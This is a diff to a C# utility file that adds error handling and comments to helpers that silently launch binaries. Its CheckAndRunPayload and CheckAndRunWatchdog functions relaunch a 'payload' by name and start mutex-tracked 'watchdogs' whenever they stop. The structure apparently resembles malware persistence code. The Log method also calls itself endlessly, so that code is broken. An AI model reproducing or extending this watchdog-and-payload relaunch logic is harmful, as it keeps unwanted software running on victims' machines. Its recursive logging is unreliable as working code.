@@ -45,7 +45,7 @@ using System.Threading;
 
         public static void Log(string message)
         {
-            if (Config.Debugging) //logs when specified by user
+            if (Config.Debugging) //logs when specified by user in Config
                 Log(message);
         }
 
@@ -107,6 +107,8 @@ using System.Threading;
 
         public static void runBinary(string filePath, string arguments = "")
         {
+        try
+        {
             // Create a new ProcessStartInfo for the executable
             ProcessStartInfo startInfo = new ProcessStartInfo
             {
@@ -138,20 +140,24 @@ using System.Threading;
                 // Note: No WaitForExit(), allowing the process to run without blocking
             }
         }
+        catch (Exception ex) { 
+        Log($"Error Running Binary: {ex.Message}");
+        }
+        }
 
 
         public static void CheckAndRunWatchdog(string watchdogPath, string watchdogName, string mutex)
         {
-            if (!IsMutexRunning(mutex))
-            {
+            if (!IsMutexRunning(mutex)) // uses mutexes to verify whether watchdogs are running
+        {
                 runBinary(Path.Combine(watchdogPath, watchdogName));
             }
         }
 
         public static void CheckAndRunPayload(string payloadPath, string payloadName)
         {
-            if (!IsProcessRunning(payloadName))
-            {
+            if (!IsProcessRunning(payloadName)) // uses the filename to verify whether payload is running
+        {
                 runBinary(Path.Combine(payloadPath, payloadName));
             }
         }
@@ -168,7 +174,7 @@ using System.Threading;
             catch (Exception ex)
             {
                 // Log or handle the exception here
-                log($"An error occurred while creating the directory: {ex.Message}");
+                Log($"An error occurred while creating the directory: {ex.Message}");
             }
         }
 
